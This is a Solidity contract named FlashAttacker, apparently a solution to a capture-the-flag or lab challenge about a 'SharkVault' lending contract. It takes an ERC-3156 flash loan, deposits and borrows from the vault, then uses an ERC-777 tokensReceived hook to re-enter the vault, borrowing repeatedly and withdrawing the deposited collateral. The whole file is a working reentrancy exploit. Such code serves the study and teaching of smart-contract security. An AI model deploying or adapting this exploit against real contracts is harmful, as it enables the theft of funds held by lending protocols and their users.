// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "@openzeppelin/contracts/interfaces/IERC20.sol";
import "./interfaces/IERC1820Registry.sol";
import "./interfaces/IERC3156FlashBorrower.sol";
import "./interfaces/IERC3156FlashLender.sol";
import "./SharkVault.sol";

contract FlashAttacker is IERC3156FlashBorrower {
    enum Action {NORMAL, OTHER}

    IERC3156FlashLender lender;
    SharkVault sharkVault;
    IERC1820Registry public registry = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    bytes32 constant private TOKENS_RECIPIENT_INTERFACE_HASH = 
        0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b; // keccak256('ERC777TokensRecipient')

    bool hasWithdraw =false;

    constructor (
        IERC3156FlashLender lender_,
        SharkVault sharkVault_
    ) {
        lender = lender_;
        sharkVault = sharkVault_;

        registry.setInterfaceImplementer(
            address(this),
            TOKENS_RECIPIENT_INTERFACE_HASH,
            address(this)
        );
    }

    /// @dev ERC-3156 Flash loan callback
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns(bytes32) {
        require(
            msg.sender == address(lender),
            "FlashBorrower: Untrusted lender"
        );
        require(
            initiator == address(this),
            "FlashBorrower: Untrusted loan initiator"
        );
        (Action action) = abi.decode(data, (Action));
        if (action == Action.NORMAL) {
            IERC20(token).approve(address(sharkVault), 3000*1e18);
            sharkVault.depositGold(1000*1e18);
            sharkVault.borrow(750*1e18);
        } else if (action == Action.OTHER) {
        }
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    /// @dev Initiate a flash loan
    function flashBorrow(
        address token,
        uint256 amount
    ) public {
        bytes memory data = abi.encode(Action.NORMAL);
        uint256 _allowance = IERC20(token).allowance(address(this), address(lender));
        uint256 _fee = lender.flashFee(token, amount);
        uint256 _repayment = amount + _fee;
        IERC20(token).approve(address(lender), _allowance + _repayment);
        lender.flashLoan(this, token, amount, data);
    }

    function tokensReceived(
        address /*operator*/,
        address from,
        address /*to*/,
        uint256 amount,
        bytes calldata /*userData*/,
        bytes calldata /*operatorData*/
    ) external {
        if(sharkVault.seagold().balanceOf(address(sharkVault))!=0){
            sharkVault.borrow(750*1e18);
        }
        
        if(!hasWithdraw){
            sharkVault.withdrawGold(1000*1e18);
            hasWithdraw = true;
        }
    }
}